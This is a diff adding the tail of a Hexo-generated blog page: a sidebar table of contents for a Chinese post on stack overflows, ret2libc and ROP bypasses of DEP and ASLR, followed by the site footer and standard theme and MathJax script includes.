+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序的栈"><span class="nav-number">1.</span> <span class="nav-text">程序的栈</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出原理"><span class="nav-number">2.</span> <span class="nav-text">栈溢出原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简单例子1"><span class="nav-number">2.0.1.</span> <span class="nav-text">简单例子1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简单例子2"><span class="nav-number">2.0.2.</span> <span class="nav-text">简单例子2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简单例子3"><span class="nav-number">2.0.3.</span> <span class="nav-text">简单例子3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ret2libc-–-Bypass-DEP-通过-ret2libc-绕过-DEP-防护"><span class="nav-number">2.1.</span> <span class="nav-text">Ret2libc – Bypass DEP 通过 ret2libc 绕过 DEP 防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP-Bypass-DEP-and-ASLR-通过-ROP-绕过-DEP-和-ASLR-防护"><span class="nav-number">2.2.</span> <span class="nav-text">ROP - Bypass DEP and ASLR 通过 ROP 绕过 DEP 和 ASLR 防护</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">3.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">UltramanGaia</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
